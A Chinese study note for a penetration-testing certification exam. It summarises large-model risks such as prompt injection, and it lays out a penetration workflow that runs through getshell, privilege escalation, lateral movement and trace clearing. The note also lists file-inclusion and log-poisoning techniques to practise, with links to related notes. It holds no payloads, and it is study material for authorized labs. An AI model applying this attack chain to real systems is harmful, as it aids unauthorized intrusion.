**⑩ 大模型**：提示注入（直接/间接）· 幻觉 · 敏感信息泄露 · 过度代理；防御 = 双向过滤 + 最小权限 + 脱敏 + 人工审核
**⑪ 渗透流程**：收集 → 探测 → 利用 → getshell → 提权 → 横向 → 清痕 → 报告
**⑫ 授权红线**：只打授权目标；超范围立即停；数据不外传

**进场前 5 分钟自问**（这三句能救回局势）：
1. 这台是什么栈？（看 Server / X-Powered-By / 404 页）
2. 它有哪些"吃用户输入"的功能点？
3. 我上一个失败的现象说明**哪一层**错了（路径？信封？后缀？编码？）

---

## 待实践（考完补）

- [ ] 考完把「实际考了什么题型/三道实操分别是什么」补进本文件 → 成为下一届的真题记录
- [ ] 未验证项：`data://`、`php://input` 亲手打一次；日志投毒亲手走一遍；upload-labs 的 Windows 特性关在 phpStudy 里验一次

## 关联笔记

- [09-16 考前复习总纲（11 类必背 payload + 工具操作卡 + 防护必答表）](./2026-09-16-CCP考前复习-Web漏洞实操与必背清单.md)
- [09-16(续) 实操带练：文件包含四档 / 命令执行四档 / upload-labs 20 关源码对照](./2026-09-16(续)-CCP实操带练-文件包含与RCE与上传绕过.md)
- [CCP备考-计划与考纲映射](./CCP备考-计划与考纲映射.md)（主线文档）
- 各漏洞详解：[SQL 注入入门](./2026-07-26-SQL注入入门.md) · [XSS 入门](./2026-08-02-XSS跨站脚本攻击入门.md) · [CSRF/SSRF](./2026-08-04-CSRF与SSRF漏洞详解.md) · [文件上传总览](./2026-07-31-文件上传漏洞.md) · [解析漏洞](./2026-07-31-文件上传解析漏洞.md) · [文件包含](./2026-08-05-文件包含漏洞详解.md) · [RCE](./2026-08-05-RCE远程代码命令执行详解.md) · [文件下载](./2026-08-07-文件下载漏洞详解.md) · [XXE](./2026-08-11-XXE与XML外部实体注入.md) · [越权](./2026-08-08-越权漏洞详解.md)
- 桌面实操素材：`Desktop/靶场练习/116.205.170.242-考试复盘/`（9001 爆破信封 + 9002 解析漏洞）· `Desktop/靶场练习/2026-09-16-学习笔记/`（含 9003 SSTI）

> ⚠️ 声明：以上技术仅用于**授权环境**（CCP 考试靶场 / 自己的本地靶机 / 授权渗透测试）。未授权测试属违法行为。
